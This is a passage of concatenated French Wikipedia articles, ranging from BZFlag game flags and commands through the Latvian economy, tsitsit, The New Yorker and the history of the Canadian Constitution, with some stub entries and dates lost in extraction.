BZFlag possède deux types de drapeau : les drapeaux d'équipe et les super drapeaux. Un drapeau d'équipe est placé dans un monde uniquement pour les parties "capture du drapeau" ; il représente l'équipe dont il a la couleur. Les super drapeaux peuvent être placés dans un monde pour les parties "match à mort/ chacun pour soi", "capture du drapeau", ou "chasse au lapin" ; mais ils sont contrôlés par l'administrateur du serveur. La quantité, le type, et la position de super drapeaux peuvent être contrôlés par l'administrateur. Les super drapeaux se déclinent en deux catégories : les bons et les mauvais, ils affectent les chars positivement ou négativement suivant cette catégorie. Un mauvais drapeau peut baisser un attribut du char : son viseur, sa vitesse ; tandis qu'un bon drapeau effectue l'opposé et aide le char. Un bon super drapeau est généralement porté jusqu'à l'explosion du char, ou jusqu'à ce que le joueur choisisse de s'en séparer. Un mauvais super drapeau est généralement automatiquement jeté après un certain temps (souvent quelques secondes), ou grâce à l'utilisation d'un drapeau "remède", ou après un certain nombre de "victoires" (explosion de chars adverses), ou encore jusqu'à ce que le char explose lui-même. Ces règles sont gérées par l'administrateur. Tous les super drapeaux ont un code d'une ou deux lettres qui est affiché à côté du nom du joueur sur le tableau des scores. Ci-dessous la liste des super drapeaux avec leur code et description.
Les bons drapeaux.
Dans une carte spéciale de la dernière version de bzflag, Apocalypse de Planet Mofo, six nouveaux drapeaux sont présents :
Les commandes de jeu.
Les serveurs acceptent de nombreuses commandes dans BZFlag. Selon les serveurs, les joueurs peuvent en utiliser certaines ou non. Les commandes ci-dessous sont des commandes générales, et certains serveurs en proposent d'autres.
Les administrateurs disposent aussi généralement de commandes pour modifier les variables d'environnement, c'est-à-dire des paramètres comme la portée, la vitesse, le nombre, de tirs. 
Les administrateurs peuvent aussi donner un drapeau spécifique a une personne.
Poll, les votes.
La commande /poll permet de soumettre un vote à tous les joueurs du serveur pour différentes raisons. On y répond en utilisant la commande /vote
Les paramètres sont énoncés dans cet ordre : 
/poll &lt;type&gt; &lt;joueur, si nécessaire&gt; &lt;commentaire&gt;
Les types peuvent être : 
À noter que les administrateurs peuvent Annuler les votes.

</doc>
<doc id="568694" url="https://fr.wikipedia.org/wiki?curid=568694" title="Économie de la Lettonie">
Économie de la Lettonie

Après une période d'indépendance tumultueuse jusqu'en 1995, l'économie de la Lettonie est de 1995 à 2008, l'une des plus prospères de l'Union européenne qu'elle a rejoint le . Cependant depuis 2008, la Lettonie est entrée en une crise économique importante, marquée par un fort chômage (21 % en 2009), ainsi qu'une forte récession (17 % du PIB en 2009). Bien que la reprise en 2010 et 2011 soit moins vigoureuse qu'en Lituanie ou en Estonie, le chômage diminue fortement et descend, en 2013 à moins de 10 %. La croissance du PIB entre 2010 et 2014 fluctue quant à elle entre +2 % et +7 %
Historique.
Durant les temps de la Hanse et l'entre deux guerres, la Lettonie use de sa position de carrefour entre l'est et l'ouest pour se développer. Cependant, la période d'occupation russe puis celle soviétique vont transformer l'industrie lettonne historiquement basée sur l'exportation de bois de papier ou de produits fermiers vers une production s'inscrivant dans la logique impérialiste de l'occupant.
La conquête de l'indépendance en 1991 conduit l'état à privatiser pour ne garder qu'un petit nombre de grandes entreprises, dont une société de production d'énergie, "Ventspils Nafta", une société de distribution de pétrole, "Lattelecom", une société de télécommunications. L'économie subit une grave récession de 1991 à 1993. L'inflation est de 958,6 % en 1992, de 25 % en 1995, 1,4 % en 2002 et de 1,9 % en 2004. La reprise de la croissance se voit interrompue par deux fois : par la banqueroute de "Banka Baltija", la plus grosse banque du pays, en 1995, et une seconde fois à la suite du krach boursier russe de 1998. La Lettonie a rejoint l'Organisation mondiale du commerce en .
La Lettonie obtient l'une des plus fortes croissances de l'union européenne dans les années 2000, la Lettonie obtient ainsi un taux de chômage de 8,8 % en 2003, une croissance de 12 % en 2006, alors le déficit financier de l'État est un des plus bas parmi les pays qui ont rejoint l'union européenne en 2004, avec en 2006 une dette de seulement 13,2 % du PIB. Cependant le pays subit une inflation assez élevée, en 2005, de 6,6 %, et de 16 % en 2007.
Du fait de la crise, l'économie lettone a connu une brutale récession de 10 % au quatrième trimestre 2008, qui a duré pendant toute l'année 2009, le pays connaît en parallèle un fort taux de chômage (23 % en 2009). Le crédit et la spéculation immobilière ont été pointés du doigt comme source de cette crise. La dette publique de la Lettonie, qui ne représentait que 9 % du PIB en 2007, atteint 19,7 % en 2008, 36,7 % du PIB en 2009, et 44,7 % en 2010 .
L'Union européenne et le FMI lui ont apporté une aide de 7,5 milliards d'euros, mais cette aide est conditionnée à une réduction draconienne des dépenses de l'État, limitée à 5 % du PIB (la prévision de récession étant de 5 % en ). Les principales mesures sont :
Monnaie.
La monnaie est l'euro depuis le . Il remplace le Lats (LVL), introduit en 1993, qui est divisé en (santims).
L'entrée dans la zone euro était prévue pour l'année 2008, mais n'a pas été possible en raison de la crise financière de 2008 et de la trop forte inflation. Un nouvel objectif a été fixé pour 2014. Ce dernier a été atteint : la Lettonie a réussi à remplir les 5 critères du Traité de Maastricht pour entrer le dans la zone euro et ainsi devenir son . Les estimations négatives du FMI en 2009 sur l'évolution de la situation économique lettone ont à l'époque remis en cause le bon déroulement de cette nouvelle étape. En décembre 2011, date de fin du plan d'aide financière sur 3 ans de l'Europe au pays, la Lettonie n'a emprunté que 4,36 milliards d'euros sur les 7,5 milliards prévus. En , la note financière de la Lettonie est redressée de BBB+ à A- : elle sort du cadre spéculatif et revient au cadre d’investissement.
Le , la Lettonie devient officiellement le européen à entrer dans la zone euro. C'est le second pays balte dans ce cas après l'Estonie.
Salaires.
L'inflation a été relativement forte mais la revalorisation du salaire minimum (+14,3 %) à 138 € ne date que de 2005 et ne permet pas vraiment un gain de pouvoir d'achat. Cependant, le gouvernement prévoit de le faire passer à 212€ en janvier 2010. Le salaire minimum est le plus bas de l'Union Européenne (11,5 fois moins que le Luxembourg) et il est le salaire de 15 % d'employés à temps complet.
Secteurs.
Secteur primaire.
12,1 % de la population active lettone travaillait dans le secteur primaire en 2006, en constituant seulement 3,7 % du PIB du pays.
L'agriculture de la Lettonie est marquée par le poids de l'élevage et de la production laitière. Les principales cultures du pays sont l'orge, le blé, le seigle, l'avoine, la pomme de terre, le lin et la betterave sucrière. La pêche et la sylviculture prennent aussi une place importante dans la production du secteur primaire letton.
Secteur secondaire.
25,8 % de la population active lettone travaillait dans le secteur secondaire en 2006, en constituant 21,5 % du PIB du pays. La Lettonie est connue pour être un important producteur de matériel ferroviaire, de radios, de réfrigérateurs, de médicaments, de sucre, de produits dérivés du bois, du textile, de produits issus de la sidérurgie, etc.
La Lettonie a produit, en 2002, 4 547 GWh d'électricité, qui provenait à 70,9 % d'énergies hydroélectriques et à 29,1 % d'énergies fossiles. Le pays a consommé la même année 5 829 GWh, en exportant 1 100 GWh d'électricité et en important 2 700 GWh. Jusqu'au , la Lettonie possédait comme principale source énergétique, la centrale nucléaire d'Ignalina, dont la fermeture s'est faite sur la demande de l'Union européenne. Un projet de remplacement de cette centrale est à l'étude en Lituanie, avec la centrale nucléaire de Visaginas.
Secteur tertiaire.
61,8 % de la population active lettone travaillait dans le secteur tertiaire en 2006, en constituant 74,8 % du PIB du pays.
En , la troisième banque commerciale du pays, ABLV, est déclarée en faillite par la BCE. Celle-ci n'étant "« probablement pas en mesure de payer ses dettes »" et de "« résister à des retraits massifs de dépôts »" de clients une fois le gel levé et en attendant son sauvetage par l’État.
Ports.
Port de Riga.
Le Port de Riga, ou "Freeport of Riga", gèré par la "Freeport of Riga Authority", couvre (en 2016) , avec une surface de stockage de , dont , et .
En 2016, en cargo, le port fonctionne en charbon (35 %), hydrocarbures (21,9 %), bois et produits dérivés (11 %), conteneurs (10,9 %), engrais (7,6 %), métaux (3,7 %), céréales (3,6 %), autres (5,4 %).
En 2016, l'importation (2016) est de (11 %), dont 50 % en transit, et l'exportation de (89 %), dont 81 % en transit.
La cargo turnover des ports baltiques est : Riga (27 %), Klaipeda (29 %), Tallinn (15 %), Ventspils (14 %), Butinge (7 %), Sillamue (5 %), Liepaja (4 %).
Le terminal de passagers de Riga est le plus important de la Lettonie.

</doc>
<doc id="568701" url="https://fr.wikipedia.org/wiki?curid=568701" title="Hyssopus">
Hyssopus

Hyssopus est un genre de plantes à fleurs de la famille des Lamiacées. Il regroupe quelques espèces de sous-arbustes originaires d'Europe et d'Asie.

</doc>
<doc id="568708" url="https://fr.wikipedia.org/wiki?curid=568708" title="Fredrik Nyberg">
Fredrik Nyberg

Fredrik Nyberg, né le à Skön, est un ancien skieur alpin suédois.

</doc>
<doc id="568712" url="https://fr.wikipedia.org/wiki?curid=568712" title="Tsitsit">
Tsitsit

Les tsitsits ("tzitzis" ou "tsitsis" selon la prononciation ashkénaze ; hébreu biblique : "ציצת" ; hébreu mishnaïque : "ציצית") sont des "franges" ou "tresses" façonnées au coin des vêtements, souvent retrouvées sur les bords du Talit. Les Juifs observants portent des vêtements munis de tsitsit afin de se conformer à une prescription biblique. Dans le judaïsme orthodoxe, le tsitsit n'est porté que par les hommes
. En outre les Samaritains ne les portent plus en signe de deuil après la destruction de leur second Temple au sommet du Mont Garizim par Alexandre le Grand.
Origine et pratique.
La Torah dit dans : « Parle aux enfants d'Israël, et tu leur diras de se faire des "tsitsit" aux coins de leurs vêtements, à travers leurs générations, et ils mettront sur le coin de chaque tsitsit un fil de "tekhelet". »
 le rappelle : « Tu mettras des franges aux quatre coins du vêtement dont tu te couvriras. »
Diverses raisons sont données pour cette prescription, à commencer par la Torah elle-même : « Afin que vous vous rappeliez tous les commandements de Dieu, et les réalisiez, et que vous ne suiviez pas les désirs de vos cœurs et de vos yeux pour vous laisser entraîner à l’infidélité. Vous vous souviendrez ainsi de Mes commandements, vous les mettrez en pratique, et vous serez saints pour votre Dieu. Je suis l’Éternel, votre Dieu, qui vous ai fait vous élever du pays d’Égypte, pour être votre Dieu. Je suis l’Éternel, votre Dieu » (Nombres 15:39-41). Rachi, commentant ces versets, fait observer que la guematria de "tsitsit" (tel que l'écrit la Mishna) est de 600, ajoutez-y les 8 fils et les 5 nœuds qui forment chaque "tzitzah" et vous obtenez le nombre de 613 mitzvot. Moïse Maïmonide (Commentaire sur Pirké Avot 2:1) l'inclut parmi les prescriptions majeures, avec la brit milah (circoncision) et le "korban pessa'h" (sacrifice de l'agneau pascal).
De nos jours, les tsitsit ne sont plus attachés qu'au "talit", le châle de prière juif. Ceci est en partie dû au fait que les vêtements ne comportent plus quatre coins, et que les franges ne sont donc plus nécessaires.
Les Juifs traditionnels portent un "talit katan" ("petit châle") en toute heure de la journée afin de respecter le commandement, certains considérant qu'il s'agit d'une transgression que de manquer un commandement que l'on serait en mesure d'accomplir. Le "talit katan" est souvent appelé "tzitzit" lui-même, bien que le nom ne se rapporte techniquement qu'aux franges.
Interprétation ésotérique juive.
Selon la Kabbale, les cinq nœuds du tsitsit correspondent aux cinq premiers mots du Shema, qui dans la religion juive est la « déclaration de foi ». Les tsitsit correspondent également à la foi, en fait ils représentent toutes les Mitzvot, d’où toute la Torah. Les Tsitsit ont 32 brins et c'est la valeur numérique du mot hébreu qui signifie « cœur », ici translittéré : "LEV". Considérant que le sixième mot du premier verset du Shema est « Echad » ou « Un » en référence à Dieu, nous déduisons à la fois l'indivisibilité entre Dieu, la Torah et le peuple juif, et la totalité de chaque juif en tant que fidèle dévot selon une nature spirituelle intrinsèque à sa propre vie terrestre et ultratterrène ou à la fois matérielle et éternelle. Cela signifie donc que, comme l'âme est la source de la vie du corps, la matérialité peut être élevée au niveau de la sainteté, c'est-à-dire du caractère sacré ; pour cette raison, les Mitzvot et la Torah sont le royaume du sacré pour le peuple juif afin d'obtenir une plus grande proximité avec Dieu, en leur permettant de Se manifester. Cela signifie que les Mitzvot et l'ensemble des Écritures de la Torah, tous les individus du peuple juif peuvent être en corrélation avec les nombreux nœuds avec les fils du Tsitsit mais, puisque le Tsitsit représente également le Nom de Dieu composé précisément de quatre lettres, alors Dieu est Un de même que l'unité du peuple juif et l'intégrité de la vérité.
Tekhelet.
Le tekhelet est une tonalité très particulière de bleu-indigo qui était obtenue à partir d'un mollusque marin appelé « chilazon » (en hébreu moderne, חילזון . Chilazon désigne un escargot), et qui était utilisé pour teindre l'un des fils dans les franges des vêtements (tsitsis). La recette de fabrication de ce « tekhelet » s'est perdue et l'identification exacte de l'animal utilisé n'est plus connue avec certitude. (Certains proposent le « Murex trunculus » ou « rocher fascié », d'autres la seiche ). Cette couleur « tekhélèth » se retrouve dans la description officielle du Drapeau d'Israël : « "Le fond est blanc sur lequel sont deux bandes tekhélèth foncée..." »

</doc>
<doc id="568713" url="https://fr.wikipedia.org/wiki?curid=568713" title="Isem">
Isem



</doc>
<doc id="568716" url="https://fr.wikipedia.org/wiki?curid=568716" title="Constitution canadienne">
Constitution canadienne



</doc>
<doc id="568717" url="https://fr.wikipedia.org/wiki?curid=568717" title="BUSE">
BUSE



</doc>
<doc id="568720" url="https://fr.wikipedia.org/wiki?curid=568720" title="Grec (homonymie)">
Grec (homonymie)

Grec est un substantif ou un adjectif qui peut désigner ou caractériser :
Sigles.
GREC peut désigner :

</doc>
<doc id="568726" url="https://fr.wikipedia.org/wiki?curid=568726" title="Arbaa Tourim">
Arbaa Tourim

Le Arbaa Tourim ("« les 4 colonnes »") ou plus communément appelé « le Tour », est un recueil de lois juives, écrit par le rabbin Yaakov ben Asher (1270-1340), environ cent ans après le Mishneh Torah de Moïse Maïmonide. Il servit de base au Choulhan Aroukh, qui emprunta notamment sa structure en quatre sections :
Le Arbaa Tourim donne uniquement les lois valides à l'époque (ne donne pas à l'étudiant les lois applicables au temps du Temple de Jérusalem). Les lois sont présentées dans la langue d'origine dont elles ont été tirées, et de fait il n'y a pas de format unique. Les auteurs sont cités par leurs noms. Dans plusieurs livres du Rambam, il y a aussi les divergences d'opinions de ceux qui décidaient des lois. Le Rabbin Yaakov ben Asher était l'un de ceux qui déterminaient les Halakhot. Le livre décrit en résumé le résultat des délibérations des Sages de France, d'Europe de l'Est et d'Espagne.

</doc>
<doc id="568743" url="https://fr.wikipedia.org/wiki?curid=568743" title="Dialectes grecs">
Dialectes grecs

La langue grecque a comporté au cours de son histoire différents dialectes :

</doc>
<doc id="568745" url="https://fr.wikipedia.org/wiki?curid=568745" title="Accentuation du grec">
Accentuation du grec



</doc>
<doc id="568747" url="https://fr.wikipedia.org/wiki?curid=568747" title="The New Yorker">
The New Yorker

 est un magazine américain qui publie des reportages, de la critique, des essais, des bandes dessinées, de la poésie et des fictions. Auparavant hebdomadaire, il est désormais publié quarante fois par an avec six éditions supplémentaires (en général plus épaisses), couvrant deux semaines.
Même si ses critiques et son agenda se concentrent sur la vie culturelle de la ville de New York, ' a un large public en dehors de la ville grâce à la qualité d’écriture de ses journalistes. Le caractère cosmopolite et urbain du magazine se résume dans la rubrique ' — "Ce qui se dit en ville" — qui propose de brefs et vifs commentaires sur la vie et la culture new-yorkaises, la culture populaire et l’excentrique Americana, même si cette rubrique s'est tournée au cours des dernières années de plus en plus vers le commentaire politique. Ses bandes dessinées, célèbres caricatures et ses nouvelles ont permis à ces genres une meilleure considération littéraire aux États-Unis. 
Au sein de la profession, les équipes de ' chargées de la correction et de la vérification des faits sont réputées pour leur rigueur. Enfin, ' est célèbre pour ses écuries d'auteurs, journalistes, collaborateurs et critiques, tous parmi les meilleurs dans leurs catégories.
Histoire.
"The New Yorker" démarra le comme édition du . La une était un dessin d'un dandy examinant un papillon à travers son monocle. Il fut fondé par Harold Ross et sa femme Jane Grant, journaliste au ' (première femme reporter de ce journal américain). Ross souhaitait créer un journal humoristique sophistiqué et subtil — se démarquant de la banalité et de la lourdeur des autres publications humoristiques, telles que "Judge" pour lequel il avait travaillé, ou . Ross s'associa au promoteur Raoul H. Fleischman pour fonder l'entreprise ' et installer les premiers bureaux du journal au 25 West Forty-fifth Street à Manhattan.
Ross continua à éditer le magazine jusqu'à sa mort en 1951. Au cours de ses premières années d'existence, parfois incertaines, le magazine s'enorgueillit de sa sophistication cosmopolite. Avec sa couverture illustrée par Rea Irvin représentant Eustace Tilley, un supposé dandy du début du siècle dernier, "" publia dans sa première édition cette célèbre déclaration — . Sous cet apparent snobisme, se cache en fait un stimulant sens de l'autodérision et de l'ironie, décalage dont jamais le magazine ne se départira.
Bien que le magazine n'ait jamais perdu son sens de l'humour, ' s'est rapidement établi comme une tribune prééminente du journalisme « sérieux » et de la fiction. Peu de temps après la fin de la Seconde Guerre mondiale, l'essai "Hiroshima" de John Hersey remplit un numéro entier. Au cours des décennies suivantes, le journal publia les nouvelles de nombreux auteurs parmi les plus respectés des , dont Ann Beattie, J. D. Salinger, Haruki Murakami, Alice Munro, Vladimir Nabokov, Philip Roth et John Updike. La publication de "La Loterie" de Shirley Jackson le engendra plus de courrier après sa publication que toutes les autres nouvelles dans l'histoire de '. Pendant ses premières décennies, le magazine publia parfois deux voire trois nouvelles chaque semaine, puis le rythme a été ramené ces dernières années à une histoire par numéro. Quoique certains thèmes et styles littéraires soient plus récurrents que d'autres dans les fictions publiées par ", les récits du magazine se distinguent moins par leur uniformité que par leur diversité, des récits intimistes de John Updike aux côtés surréalistes de Donald Barthelme, allant de tranches de vie de New-Yorkais névrosés à des récits situés dans des lieux et époques variés et traduits de nombreuses langues.
Les articles de fond constituent la plus grosse partie du magazine : ils sont connus pour couvrir un ensemble éclectique de thèmes. On trouve parmi les sujets récents l'excentrique évangéliste Creflo Dollar, les différentes manières dont les humains perçoivent le passage du temps et le syndrome de Münchhausen.
Une française, Françoise Mouly, est directrice artistique depuis 1993 et choisit les couvertures du magazine.
Couvertures.
Cette couverture du magazine est traditionnellement un dessin, un choix correspond à cette volonté d'être à la fois drôle, subtil, et sérieux sur l'information délivrée au lecteur. Au cours du temps, cette Une a su être souvent historique, critique, mais aussi provocatrice ou polémique.
La couverture du magazine du déclenche ainsi une controverse aux États-Unis en pleine campagne présidentielle. Une caricature en pleine page représente le candidat démocrate Barack Hussein Obama et sa femme Michelle habillés, lui en terroriste musulman et elle en militante du Black Panther Party, se tenant dans le Bureau ovale avec un portrait d'Oussama Ben Laden au mur et le drapeau américain brûlant dans la cheminée. Face aux critiques sur ce dessin, le magazine a tenté d'expliquer que c'était une satire de la caricature que la droite conservatrice avait essayé de donner d'Obama.
Collaborateurs historiques.
Écrivains.
Truman Capote, Janet Flanner, Stephen King, Haruki Murakami, Vladimir Nabokov, Dorothy Parker, Philip Roth, J. D. Salinger, James Thurber, John Updike, E. B. White, etc.
Dessinateurs.
Charles Addams, Rea Irvin, Saul Steinberg, Gahan Wilson, Jean-Jacques Sempé, Helen Hokinson, Peter Arno, Whitney Darrow Jr., Henry Martin, Pascal Campion, Frank Walts, etc.
Journalistes.
Lillian Ross

</doc>
<doc id="568753" url="https://fr.wikipedia.org/wiki?curid=568753" title="Constitution du Canada">
Constitution du Canada

La Constitution du Canada () est l'ensemble des règles de droit qui organisent les institutions du Canada et déterminent les règles fondamentales qui régissent la société canadienne. Elle est la et toute autre disposition de droit doit s'y conformer.
La Constitution du Canada établit certains principes fondamentaux du pays. C'est une monarchie constitutionnelle et le souverain est le roi Charles III, représenté au Canada par un gouverneur général. Le pays est organisé selon le principe du fédéralisme qui prévoit un partage des compétences entre le parlement fédéral et les provinces. Le système politique est basé sur le système de Westminster. La Constitution protège des droits de la personne, notamment par la Charte canadienne des droits et libertés. La Constitution prévoit aussi un principe de séparation des pouvoirs qui garantit une indépendance judiciaire aux tribunaux.
La Constitution est composée principalement de trois éléments : les textes constitutionnels, les décisions judiciaires et les conventions constitutionnelles. Contrairement à plusieurs pays, la Constitution canadienne n'est pas regroupée dans un document unique. Elle est répartie dans quelques dizaines de textes dont les deux principaux sont la Loi constitutionnelle de 1867 et la Loi constitutionnelle de 1982. Par les décisions judiciaires, la Constitution comprend des principes constitutionnels implicites. Le droit constitutionnel du Canada est la branche du droit qui étudie la Constitution du Canada.
Histoire.
L'histoire de la Constitution du Canada débute à la suite de la Guerre de Sept Ans lorsque la France cède, par les traités de Fontainebleau et Paris, une grande partie de ses colonies à l'Espagne et à la Grande-Bretagne. La Grande-Bretagne adopte en 1763 la Proclamation royale qui peut être considéré comme le premier régime constitutionnel sur le territoire canadien. L'histoire de la Constitution du Canada se poursuit au avec la Confédération canadienne, un projet de regrouper toutes les colonies de l'Amérique du Nord britannique en une fédération sous le nom de Dominion du Canada. L'histoire sera ensuite ponctuée par deux autres événements juridiques marquants : la souveraineté externe et législative définitivement acquises avec le Statut de Westminster de 1931 et le rapatriement de la Constitution lors de l'adoption de la Loi de 1982 sur le Canada.
La Proclamation royale (1763).
C'est par la Conquête britannique du Nord de la Nouvelle-France que débute réellement le droit constitutionnel canadien. Depuis 1760, il n'y a pas eu de rupture du droit constitutionnel, mais une simple évolution. À la suite de la victoire de la Grande-Bretagne sur la France dans la Guerre de Sept Ans, le roi George III édicte la Proclamation royale de 1763. Ce document, souvent considéré comme le premier document constitutionnel canadien, prévoit la création de la Province de Québec. La Proclamation a pour effet d'abroger le droit français et de le remplacer par le droit anglais. La situation constitutionnelle est alors réellement celle d'une conquête : le droit anglais s'applique sur les sujets francophones du Québec et le pouvoir y est exercé de manière absolue. La Province de Québec ne bénéficie pas d'institutions parlementaires, contrairement à la situation qui prévaut en Grande-Bretagne.
L'Acte de Québec (1774).
Le régime constitutionnel drastique de la Proclamation royale sera en partie corrigé par l'Acte de Québec. En 1774, pour éviter que les habitants de la Province ne se joignent au mouvement indépendantiste en cours aux États-Unis, le roi adoucit la Proclamation. Le territoire de la Province de Québec est agrandi et le droit civil est réinstauré dans les affaires privées (propriété et droit civil). Le droit criminel continue toutefois d'être celui de la Grande-Bretagne. Le retour du droit civil dans la Province de Québec est à l'origine de la tradition de droit civil toujours présente au Québec.
L'Acte constitutionnel (1791).
La « troisième » constitution canadienne est considérée comme l'Acte constitutionnel de 1791. Après la déclaration d'indépendance des États-Unis, un grand nombre de loyalistes s'enfuient dans la province de Québec pour rester fidèles à la Couronne britannique. Ces anglophones, nouvellement présents sur le territoire, n'apprécient guère y trouver le droit français et souhaitent obtenir une assemblée législative, ce qui faisait alors défaut au Québec. Leur présence poussa donc le roi à diviser la colonie en deux entités distinctes : le Haut-Canada et le Bas-Canada. L'Acte constitutionnel prévoit la création, dans chacune des colonies, d'une assemblée législative et d'un conseil législatif. Les lois adoptées par les assemblées législatives sont toutefois soumises à l'approbation royale et le gouvernement (conseil législatif) n'a pas à avoir la confiance de l'assemblée pour gouverner.
L'Acte d'Union (1840).
Le système démocratique embryonnaire de l'Acte constitutionnel mènera aux rébellions de 1837 dans le Bas et le Haut-Canada. Sur le fond d'une crise économique et agricole, les habitants des deux colonies se révoltent et revendiquent l'obtention du gouvernement responsable. La révolte est plus marquée au Bas-Canada où les francophones protestent contre l'oligarchie coloniale cherchant à les assimiler à la culture canadienne-anglaise. La révolte sera durement réprimée par l'armée britannique. La Constitution de 1791 est suspendue. Le rapport Durham, une enquête par le Royaume-Uni sur les raisons de la rébellion, mène à une réforme constitutionnelle : l'Acte d'Union. Cette nouvelle Constitution fusionne les deux colonies pour créer le Canada-Uni. On y trouve alors le premier embryon du fédéralisme canadien puisque le Parlement est composé de deux chambres et peut adopter des lois qui ne touchent que l'une ou l'autre des composantes de la colonie. Afin d'assimiler les francophones, l'anglais est imposé comme langue officielle. Le gouvernement responsable ne sera obtenu qu'en 1848. La même année, sous l'impulsion notamment de Louis-Hippolyte La Fontaine et Robert Baldwin, le français redevient autorisé dans les débats au parlement.
L'Acte de l'Amérique du Nord britannique (1867).
Le contexte économique et l'augmentation importante de l'influence des États-Unis en Amérique septentrionale mène à un changement radical dans l'organisation constitutionnelle canadienne. D'une part, le Royaume-Uni met fin au tarif préférentiel pour les colonies, ce qui oblige les Canadiens à se tourner vers le marché américain. Ensuite, la guerre de Sécession amène un besoin de sécurité supplémentaires dans les colonies de l'Amérique du Nord britannique face à une menace d'expansion américaine. Une fédération des colonies est alors choisie comme solution.
L'union des colonies du Canada-Uni, du Nouveau-Brunswick et de la Nouvelle-Écosse pour former le Dominion du Canada a finalement lieu le . L'actuelle Constitution canadienne est alors adoptée. Le Parlement britannique édicte l'Acte de l'Amérique du Nord britannique (AANB), une loi destinée à fédérer les trois colonies et à fonder le Dominion. Cette loi est basée sur un compromis entre les acteurs politiques qui souhaitent créer un État unitaire centralisé et ceux qui souhaitent une union décentralisée. C'est ainsi qu'un système fédéral à tendance centralisateur est retenu dans l'AANB (voir Fédéralisme canadien). Les hommes politiques l'appellent alors « Confédération canadienne », alors qu'il s'agit en fait d'une « fédération ». Plusieurs provinces s'ajoutent dans les années suivant la confédération : le Manitoba (1870), la Colombie-Britannique (1871), l'Île-du-Prince-Édouard (1873), la Saskatchewan (1905) et l'Alberta (1905).
La Confédération est légalement une création du Parlement britannique et elle marque la mise en place d'une entité semi-souveraine qui, dans un processus s'étalant de 1867 à 1982, obtiendra graduellement une pleine souveraineté. L'Acte de l'Amérique du Nord britannique de 1867 donne une souveraineté interne au Dominion, puis il obtient la souveraineté externe durant l'entre-deux-guerres. La participation du Canada à la Première Guerre mondiale change son statut à l'international, puisqu'il devient ensuite un signataire du Traité de Versailles en 1919 et un membre cofondateur de la Société des Nations en 1920. Ces évènements lui donne "de facto" une souveraineté externe. La situation est reconnue par le Royaume-Uni avec la déclaration Balfour de 1926 et la conférence impériale de 1930. En résolution, le Parlement britannique adopte le Statut de Westminster de 1931. Cette loi garantie la souveraineté externe du Canada. Également, la loi garantie le fait que le Parlement britannique ne peut plus adopter de lois pour le Canada sans son accord, mais garde la possibilité de modifier l'Acte de l'Amérique du Nord britannique. Dès la Confédération, il était entendu que le gouvernement britannique n'interfère plus dans les affaires internes du Canada. Le pouvoir de désaveu et réserve sur la législation fédérale a perduré théoriquement mais il a cessé d'être utilisé dès les années 1870. Le Statut de Westminster a pour effet d'officialiser cette situation.
Outre la souveraineté externe acquise durant l'entre-deux-guerres, les principes importants de la Constitution du Canada restent inchangés jusqu'en 1982. Le Parlement britannique adopte tout de même plusieurs modifications mineures de la Constitution. Sur le plan judiciaire, les appels au Comité judiciaire du Conseil privé sont abolis en 1949. La Cour suprême du Canada devient ainsi le plus haut tribunal canadien dans tous les domaines (constitutionnel, civil, criminel). Les années 1960 et 1970 sont marquées par de fréquentes discussions entre les provinces et le gouvernement fédéral sur plusieurs réformes constitutionnelles. Alors que le gouvernement fédéral souhaite adopter une formule de modification de la Constitution (c'est le Parlement britannique à ce moment qui avait le pouvoir de modifier la Constitution), les provinces, notamment le Québec, souhaitent revoir le partage des compétences législatives fixées dans l'Acte de l'Amérique du Nord britannique. Les négociations mènent à plusieurs propositions de formules de modification (formule Fulton-Favreau, Charte de Victoria) sans qu'aucune ne soit retenue.
Rapatriement (1982).
Approuvé par tous les gouvernements fédéral et provinciaux, à l'exception de celui du Québec, à la fin de la conférence constitutionnelle de 1981, le rapatriement de la Constitution du Canada proclamait le 17 avril 1982 la Loi constitutionnelle de 1982 qui assurait la pleine souveraineté du Canada par rapport au Royaume-Uni. La partie V de cette loi établissait une formule d'amendement de la Constitution du Canada, dont l'absence (en raison de plus de cinquante ans de désaccord entre les gouvernements fédéral et provinciaux) était la seule raison pour laquelle les modifications constitutionnelles du Canada devaient encore être approuvées par le Parlement britannique après l’application du Statut de Westminster de 1931. La Loi constitutionnelle de 1982 a été promulguée sous forme d'annexe à la Loi de 1982 sur le Canada, une loi britannique qui a été présentée à la demande d'une adresse conjointe à la Reine par le Sénat et la Chambre des communes du Canada. En plus de promulguer la Loi constitutionnelle de 1982, la Loi de 1982 sur le Canada prévoit qu'aucune autre loi britannique ne s'appliquera au Canada dans le cadre de sa loi, mettant ainsi la dernière main à la souveraineté du Canada. Le Canada dispose désormais d'une pleine souveraineté et peut modifier sa propre Constitution sans passer par le Royaume-Uni.
Contenu.
La Constitution du Canada ne se retrouve pas dans un seul texte formel. Elle est basée sur un grand nombre de sources différentes, dont certaines sont écrites, d'autres non. La Constitution est donc, en grande partie, héritée de la tradition britannique pour laquelle il n'existe pas de document constitutionnel unique (voir Constitution du Royaume-Uni).
Ainsi, la constitution est un amalgame de règles qui gouvernent les relations entre l'État et les citoyens. Certaines de ces règles sont écrites, d'autres non ; certaines sont formelles, d'autres informelles ; certaines se modifient facilement, d'autres moins. Ainsi, les principaux textes constitutionnels ont certainement une autorité supérieure sur les autres règles, mais ils ne constituent pas l'ensemble de la Constitution. De même, certaines sources la Constitution sont légales et d'autres simplement politiques.
Une partie du droit constitutionnel anglais ayant été importé au Canada lors de la Conquête de 1760, certaines sources de la Constitution du Canada peuvent se situer dans le droit anglais antérieur à cet événement.
Il existe principalement trois types de sources de la Constitution du Canada :
Textes constitutionnels.
Il existe un grand nombre de textes qui font partie de la Constitution du Canada. Le plus ancien remonte probablement au avec la "". Puisque le Canada a hérité du droit constitutionnel anglais, plusieurs des textes provenant de ce pays font toujours partie de la Constitution.
Toutefois, les textes les plus importants de la Constitution sont la Loi constitutionnelle de 1867 et la Loi constitutionnelle de 1982. Ces deux textes régissent plusieurs des principes fondamentaux du Canada.
Jusqu'en 1982, le Canada n'avait pas le pouvoir de modifier une grande partie de sa Constitution. Il devait demander au Royaume-Uni de le faire. Ainsi, la plupart des textes constitutionnels du Canada sont des lois ou des décrets du Royaume-Uni.
Loi constitutionnelle de 1867.
La Loi constitutionnelle de 1867 (anciennement appelée « Acte de l'Amérique du Nord britannique ») est le texte fondateur de la Confédération canadienne en 1867 et était également le document fondamental de la Constitution canadienne jusqu'en 1982. Elle est adoptée par le Parlement britannique en 1867 pour faire suite aux négociations des pères de la Confédération visant à créer le Canada.
